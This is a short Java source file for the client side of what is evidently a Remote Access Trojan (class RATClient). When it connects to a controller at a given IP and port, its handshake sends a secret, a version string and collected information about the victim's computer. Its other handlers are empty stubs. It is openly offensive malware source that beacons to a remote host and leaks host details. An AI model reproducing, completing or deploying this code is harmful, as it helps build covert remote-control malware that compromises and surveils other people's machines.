package main.java.rat.client;

import main.java.Main;
import main.java.rat.Environment;
import main.java.rat.handlers.InputOutputHandler;
import main.java.rat.models.ComputerInfo;


public class RATClient extends AbstractSocketClient implements Environment {

    public RATClient(String ip, int port) {
        super(ip, port);
    }

    @Override
    void connectedClient(InputOutputHandler handler) {
        this.handleInitHandshake();
    }

    private void handleInitHandshake() {
        this.inputOutputHandler.sendMessage(Main.SECRET);
        this.inputOutputHandler.sendMessage(Main.VERSION);
        this.inputOutputHandler.sendMessage(ComputerInfo.create());
    }


    @Override
    public void disconnected() {

    }

    @Override
    public void receivedMessage(Object message) {

    }

    @Override
    public boolean isServer() {
        return false;
    }

    @Override
    public boolean isClient() {
        return true;
    }
}
